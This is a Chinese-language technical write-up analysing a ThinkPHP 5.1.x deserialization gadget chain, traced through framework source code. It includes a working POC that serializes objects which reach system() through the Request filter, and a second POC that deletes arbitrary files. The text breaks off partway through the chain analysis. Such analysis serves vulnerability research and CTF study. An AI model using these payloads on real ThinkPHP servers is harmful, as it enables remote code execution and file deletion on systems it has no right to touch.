## 前言
之前看到关于thinkphp5反序列化链的分析以及不久前做的很多ctf赛题中都考到了反序列化链挖掘去利用的题目，并未进行分析，这里详细分析一下5.1和5.2版本。。
## 5.1.x版本分析
这里先分析一下thinkphp5.1版本反序列化漏洞。
**环境**  
thinkphp 5.1.38  
php 7.2
**漏洞挖掘思路**  
挖掘反序列化漏洞过程中，很多时候都是利用php中的魔术方法触发反序列化漏洞。但如果漏洞触发代码不在魔法函数中，而在一个类的普通方法中。并且魔法函数通过属性（对象）调用了一些函数，恰巧在其他的类中有同名的函数（pop链）。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。  
一般来说，反序列化的利用点为：  
`__construct`构造函数每次创建对象都会调用次方法
`__destruct`析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行
`__wakeupunserialize()`执行前会检查是否存在一个`__wakeup()`方法，如果存在会先调用
`__toString` 一个对象被当字符串用的时候就会去执行这个对象的`__toString`
`__wakeup()`执行漏洞：一个字符串或对象被序列化后，如果其属性被修改，则不会执行`__wakeup()`函数，这也是一个绕过点。`__wakeup()`漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过`__wakeup`的执行。
挖掘的思路很多师傅都写了，所以我就直接从poc就细节方面去直接分析一下整个链的利用过程。
**POC**
    append = ["lin"=>["calc.exe","calc"]];
            $this->data = ["lin"=>new Request()];
        }
    }
    class Request
    {
        protected $hook = [];
        protected $filter = "system";
        protected $config = [
            // 表单ajax伪装变量
            'var_ajax'         => '_ajax',  
        ];
        function __construct(){
            $this->filter = "system";
            $this->config = ["var_ajax"=>'lin'];
            $this->hook = ["visible"=>[$this,"isAjax"]];
        }
    }
    namespace think\process\pipes;
    use think\model\concern\Conversion;
    use think\model\Pivot;
    class Windows
    {
        private $files = [];
        public function __construct()
        {
            $this->files=[new Pivot()];
        }
    }
    namespace think\model;
    use think\Model;
    class Pivot extends Model
    {
    }
    use think\process\pipes\Windows;
    echo base64_encode(serialize(new Windows()));
    ?>
**漏洞利用过程**
在寻找利用链时从php中的魔术方法入手，我们从`/thinkphp/library/think/process/pipes/Windows.php`的`__destruct()`方法入手。首先会触发poc里定义的`__construct`方法，然后触发同类下的`__destruct()`方法(就是前面说的windows类下的)，`__construct`方法定义files数组创建了一个Pivot对象，该对象继承Model类，然后会触发Model类中的`__construct()`方法，先知道这些就行，然后先看windows类这里触发的`__destruct()`方法
`__destruct()`里面调用了两个函数，一个关闭连接close()方法，忽略，然后我们跟进`removeFiles()`函数。
发现该方法是删除临时文件的。
    namespace think\process\pipes;
    use think\Process;
    class Windows extends Pipes
    {
        /** @var array */
        private $files = [];
        ......
        private function removeFiles()
        {
            foreach ($this->files as $filename) {   //遍历files数组中的[new Pivot()]
                if (file_exists($filename)) {    //若存在该文件名便删除文件
                    @unlink($filename);
                }
            }
            $this->files = [];
        }
    ....
    }
这里调用了一个`$this->files`，而且这里的变量`$files`是可控的。所以这里存在一个任意文件删除的漏洞。
POC：
    namespace think\process\pipes;
    class Pipes{
    }
    class Windows extends Pipes
    {
    private $files = [];
    public function __construct()
    {
    $this->files=['需要删除文件的路径'];
    }
    }
    echo base64_encode(serialize(new Windows()));
这里只需要一个反序列化漏洞的触发点，若后期开发存在反序列化漏洞，便可以实现任意文件删除。  
回归正题，  
在`removeFiles()`中使用了`file_exists`对`$filename`进行了处理。我们进入`file_exists`函数可以知道，`$filename`会被作为字符串处理。
而`__toString` 当一个对象在反序列化后被当做字符串使用时会被触发，我们通过传入一个对象来触发`__toString`
方法。搜索`__toString`方法。因为前面我们传入的是一个Pivot对象，所以此时便会触发`__toString`方法。
这里有很多地方用到，我们跟进\thinkphp\library\think\model\concern\Conversion.php的Conversion类的`__toString()`方法，这里调用了一个`toJson()`方法。  
然后跟进toJson()方法。
    /**
         * 转换当前数据集为JSON字符串
         * @access public
         * @param  integer $options json参数
         * @return string
         */
        public function toJson($options = JSON_UNESCAPED_UNICODE)
        {
            return json_encode($this->toArray(), $options);
        }
这里调用了`toArray()`方法，然后转换为json字符串，继续跟进`toArray()`。
    public function toArray()
        {
            $item       = [];
            $hasVisible = false;
          ......
            // 追加属性（必须定义获取器）
            if (!empty($this->append)) {                  //在poc中$this->append = ["lin"=>["calc.exe","calc"]];
                foreach ($this->append as $key => $name) {  //遍历append，此时$key='lin',$name=["calc.exe","calc"]
                    if (is_array($name)) {
                        // 追加关联对象属性
                        $relation = $this->getRelation($key);  //$relation=null,下面分析
                        if (!$relation) {
                            $relation = $this->getAttr($key);  
                            if ($relation) {
                                $relation->visible($name);
                            }
                        }
                .......
        }
我们需要在`toArray()`函数中寻找一个满足`$可控变量->方法(参数可控)`的点，这里`$append`是可控的，这意味着`$relation`也可控，所以如果找到一个`__call`方法(调用类中不存在的方法会被执行)，并且该类没有visible方法，这是一个代码执行的点，具体后面分析。  
该函数中调用一个`getRelation()`方法，另一个`getAttr()`方法，下面判断了变量`$relation`，若
`!$relation`，继续调用`getAttr()`方法，所以我们跟进这俩方法，看有没有可利用的点。  
跟进`getRelation()`  
在thinkphp\library\think\model\concern\RelationShip.php中，该方法位于RelationShip类中。
由于`$key=lin`，跳过第一个if，而`$key`也不在`$this->relation`中，返回空。然后调用了getAttr方法，我们跟进getAttr方法  
在\thinkphp\library\think\model\concern\Attribute.php中，位于Attribute类中。
    public function getAttr($name, &$item = null)  //$name = $key = 'lin'
        {
            try {
                $notFound = false;
                $value    = $this->getData($name);  
            } catch (InvalidArgumentException $e) {
                $notFound = true;
                $value    = null;
            }
这里调用了一个getData()方法，继续跟进
    public function getData($name = null)   //$name = $key = 'lin'
        {
            if (is_null($name)) {    //$name 为空返回data
                return $this->data;
            } elseif (array_key_exists($name, $this->data)) {  //查找$name是否为data数组里的键名，因为data可控，在poc里定义为$this->data = ["lin"=>new Request()]; 所以存在
                return $this->data[$name];  //返回结果为new Request()
            } elseif (array_key_exists($name, $this->relation)) {
                return $this->relation[$name];  
            }
            throw new InvalidArgumentException('property not exists:' . static::class . '->' . $name);
        }
通过查看getData函数我们可以知道`toArray()`方法中的`$relation`的值为`$this->data[$name]`  
toArray():
    if (!$relation) {
                            $relation = $this->getAttr($key);  //$relation = new Request()
                            if ($relation) {
                                $relation->visible($name);   //new Request()-> visible($name) ,$name = ["calc.exe","calc"] 所以就需要上面说的找一个__call代码执行点。
                            }
                        }
需要注意的一点是这里类的定义使用的是Trait而不是class。自 PHP 5.4.0 起，PHP 实现了一种代码复用的方法，称为
trait。通过在类中使用use 关键字，声明要组合的Trait名称。所以，这里类的继承要使用use关键字。
现在我们的可控变量有三个，
`$files`位于类Windows  
`$append`位于类Conversion  
`$data`位于类Attribute
windows类另行构造，所以我们现在需要一个同时继承了Attribute类和Conversion类的子类，在\thinkphp\library\think\Model.php中找到这样一个类
**代码执行点分析**
现在还缺少一个代码执行可导致RCE的点，需要满足一下条件  
1.该类中没有`visible`方法  
2.类中实现了`__call`方法  
一般PHP中的`__call`方法都是用来进行容错或者是动态调用,所以一般会在`__call`方法中使用
    __call_user_func($method, $args)
    __call_user_func_array([$obj,$method], $args)
但是 `public function __call($method, $args)` 我们只能控制 `$args`,所以很多类都不可以用  
经过查找发现/thinkphp/library/think/Request.php 中的 `__call` 使用了一个array取值的
    public function __call($method, $args)
    {
     if (array_key_exists($method, $this->hook)) {
     array_unshift($args, $this);
     return call_user_func_array($this->hook[$method], $args);
     }
     throw new Exception('method not exists:' . static::class . '->' . $method);
    }
这里的 `$hook`是我们可控的,所以我们可以设计一个数组 `$hook= {“visable”=>”任意method”}`  
但是这里有个 `array_unshift($args, $this);`会把`$this`放到`$arg`数组的第一个元素这样我们只能
    call_user_func_array([$obj,"任意方法"],[$this,任意参数])
    也就是
    $obj->$func($this,$argv)
这种情况是很难执行命令的,但是Thinkphp作为一个web框架,  
Request类中有一个特殊的功能就是过滤器 filter(ThinkPHP的多个远程代码执行都是出自此处)  
所以可以尝试覆盖filter的方法去执行代码  
在/thinkphp/library/think/Request.php中找到了filterValue()方法。
该方法调用了call_user_func函数，但`$value`参数不可控，如果能找到一个`$value`可控的点就好了。  
发现input()满足条件，这里用了一个回调函数调用了filterValue，但参数不可控不能直接用
    ....
        public function input($data = [], $name = '', $default = null, $filter = '')
        {
            if (false === $name) {
                // 获取原始数据
                return $data;
            }
            ....
           // 解析过滤器
            $filter = $this->getFilter($filter, $default);
            if (is_array($data)) {
                array_walk_recursive($data, [$this, 'filterValue'], $filter);
              .....
            } else {
                $this->filterValue($data, $name, $filter);
            }
    .....
所以接着找能控的函数点，这里找到了param函数，
    public function param($name = '', $default = null, $filter = '')
        {
             if (!$this->mergeParam) {
                $method = $this->method(true);
               .....
                // 当前请求参数和URL地址中的参数合并为一个数组。
                $this->param = array_merge($this->param, $this->get(false), $vars, $this->route(false));
                $this->mergeParam = true;
            }
            if (true === $name) {
                // 获取包含文件上传信息的数组
                $file = $this->file();
                $data = is_array($file) ? array_merge($this->param, $file) : $this->param;
                return $this->input($data, '', $default, $filter);
            }
            return $this->input($this->param, $name, $default, $filter);
        }
这里调用了input()函数，不过参数仍然是不可控的，所以我们继续找调用param函数的地方。找到了isAjax函数